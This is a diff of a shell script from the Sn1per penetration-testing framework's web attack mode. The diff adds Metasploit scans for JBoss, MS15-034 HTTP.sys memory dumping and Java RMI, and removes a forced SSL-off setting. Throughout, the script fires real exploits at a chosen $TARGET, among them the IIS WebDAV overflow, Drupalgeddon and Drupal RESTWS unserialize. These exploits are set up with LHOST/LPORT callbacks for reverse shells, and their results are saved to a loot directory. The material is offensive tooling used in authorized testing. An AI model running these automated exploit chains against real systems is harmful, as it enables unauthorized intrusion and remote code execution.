@@ -2,21 +2,27 @@
             /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Started Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
       fi
       echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING JBOSS VULN SCANNER $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/jboss_vulnscan; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-jboss_vulnscan.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-jboss_vulnscan.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-jboss_vulnscan.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-jboss_vulnscan.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING HTTP PUT UPLOAD SCANNER $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg SSL false; run; set PATH /uploads/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw
+      msfconsole -q -x "use scanner/http/http_put; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; set PATH /uploads/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-http_put.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING WEBDAV SCANNER $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg SSL false; run; use scanner/http/webdav_website_content; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw
+      msfconsole -q -x "use scanner/http/webdav_scanner; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; use scanner/http/webdav_website_content; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-webdav_website_content.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING MICROSOFT IIS WEBDAV ScStoragePathFromUrl OVERFLOW $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw
+      msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-iis_webdav_scstoragepathfromurl.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -79,6 +85,12 @@
       msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; setg URI /drupal/; setg TARGETURI /drupal/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING MS15-034 HTTP.SYS MEMORY LEAK EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-ms15_034_http_sys_memory_dump.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -193,6 +205,12 @@
       msfconsole -q -x "use unix/webapp/drupal_restws_unserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; setg SSL "$SSL"; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; setg URI /drupal/; setg TARGETURI /drupal/; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_restws_unserialize.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING JAVA RMI SCANNER $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use auxiliary/scanner/misc/java_rmi_server; setg RHOSTS \"$TARGET\"; set RPORT \"$PORT\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-java_rmi_server.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-java_rmi_server.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-java_rmi_server.raw 2> /dev/null
       if [ "$SLACK_NOTIFICATIONS" == "1" ]; then
             /bin/bash "$INSTALL_DIR/bin/slack.sh" "[xerosecurity.com] •?((¯°·._.• Finished Sn1per webpwn scan: $TARGET [$MODE] (`date +"%Y-%m-%d %H:%M"`) •._.·°¯))؟•"
       fi
